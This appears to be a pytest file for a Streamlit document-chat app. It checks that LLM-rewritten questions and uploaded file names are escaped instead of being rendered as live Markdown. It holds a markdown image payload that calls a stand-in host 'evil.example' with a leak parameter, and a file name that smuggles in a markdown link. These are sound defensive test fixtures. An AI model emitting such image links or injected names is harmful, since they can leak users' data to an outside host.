"""Text from documents, file names and LLMs is shown as text, never as live Markdown."""

import re
from types import ModuleType

from streamlit.testing.v1 import AppTest

from tests.ui.conftest import page
from tests.ui_fakes import ANSWER, DOC, FakeApi

EVIL = "![x](http://evil.example/?leak=1)"
LIVE_LINK = re.compile(r"(?<!\\)\]\(")  # a "](" that is not escaped


def is_safe(text: str) -> bool:
    return LIVE_LINK.search(text) is None


def test_rewritten_question_cannot_inject_markdown(api_client_module: ModuleType) -> None:
    api = FakeApi()
    api.routes[("POST", "/ask")] = (200, {**ANSWER, "standalone_question": EVIL})
    api_client_module.TRANSPORT = api.transport()
    at = AppTest.from_file(page("Home.py"), default_timeout=30).run()
    at.chat_input[0].set_value("and that?").run()
    captions = [str(c.value) for c in at.caption if "Searched for" in str(c.value)]
    assert captions and EVIL not in captions[0] and is_safe(captions[0])


def test_file_names_cannot_inject_markdown(api_client_module: ModuleType) -> None:
    name = "a](http://evil.example).pdf"
    api = FakeApi()
    citation = {**ANSWER["citations"][0], "filename": name}  # type: ignore[index]
    api.routes[("POST", "/ask")] = (200, {**ANSWER, "citations": [citation]})
    api.routes[("GET", "/documents")] = (200, [{**DOC, "filename": name}])
    api_client_module.TRANSPORT = api.transport()

    chat = AppTest.from_file(page("Home.py"), default_timeout=30).run()
    chat.chat_input[0].set_value("question").run()
    assert chat.expander and all(is_safe(x.label) for x in chat.expander)

    docs = AppTest.from_file(page("pages/1_Documents.py"), default_timeout=30).run()
    next(b for b in docs.button if b.label == "Delete this document").click().run()
    assert docs.warning and all(is_safe(str(w.value)) for w in docs.warning)
